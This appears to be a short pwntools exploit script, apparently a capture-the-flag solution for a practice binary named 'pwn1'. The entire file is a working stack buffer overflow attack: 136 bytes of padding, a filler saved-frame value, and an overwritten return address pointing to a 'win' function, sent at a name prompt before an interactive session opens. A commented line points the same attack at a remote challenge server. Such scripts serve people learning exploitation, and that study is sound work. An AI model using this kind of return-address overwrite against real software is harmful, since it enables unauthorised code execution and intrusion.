#!/usr/bin/python3

from pwn import *

exe = ELF('./pwn1', checksec=False)
# p = remote("14.225.255.41", 13331)
p = process(exe.path)

# input()
payload = b'a'*136 + p64(0xdeadbeef)
win = 0x000000000040130c
payload += p64(win)
p.sendafter(b'name: ', payload)

p.interactive()